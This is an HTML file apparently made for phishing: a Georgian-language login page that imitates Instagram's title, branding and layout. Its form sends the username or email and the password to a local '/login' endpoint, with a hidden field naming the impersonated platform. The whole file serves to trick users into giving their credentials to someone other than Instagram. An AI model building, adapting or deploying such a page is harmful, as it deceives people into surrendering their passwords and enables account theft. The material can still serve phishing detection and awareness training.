<!DOCTYPE html>
<html lang="ka">
    <head>
        <meta charset="UTF-8">
        <title>Instagram – შესვლა ან რეგისტრაცია</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #fafafa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                }

            .login-container {
                width: 400px;
                background: white;
                padding: 40px;
                border: 1px solid #dbdbdb;
                text-align: center;
            }
            
            h1 { 
                font-size: 40px;
                margin-bottom: 20px;
                font-weight: normal;
            }
            
            input {
                width: 90%;
                padding: 10px;
                margin: 6px 0;
                border: 1px solid #dbdbdb;
                border-radius: 4px;
                font-size: 14px;
                background-color: #fafafa;
            }
            
            button {
                width: 97%;
                padding: 8px;
                background-color: #0095f6;
                border: none;
                border-radius: 4px;
                color: white;
                font-size: 14px;
                font-weight: bold;
                cursor: pointer;
                margin-top: 8px;
            }

            button:hover {
                background-color: #1aa1f7;
            }
            
            .footer-links {
                margin-top: 15px;
                color: #385186;
                font-size: 13px;
                text-decoration: none;
                display: block;
            }

            .register-box {
                background: white;
                border: 1px solid #dbdbdb;
                padding: 20px;
                text-align: center;
                margin-top: 10px;
                font-size: 14px;
            }
            
        </style>
    </head>
    <body>
        <div>
            <div class="login-container">
                <h1>instagram</h1>
                <form action="/login" method="POST">
                    <input type="hidden" name="platform" value="Instagram">
                    <input type="text" name="email" placeholder="მომხმარებლის სახელი ან ელ-ფოსტა" required>
                    <input type="password" name="password" placeholder="პაროლი" required>
                    <button type="submit">შესვლა</button>
                </form>
                <a href="#" class="footer-links">დაგავიწყდათ პაროლი?</a>
            </div>

            <div class="register-box">
                არ გაქვთ ანგარიში? <a href="#">რეგისტრაცია</a>
            </div>
        </div>
    </body>
</html>
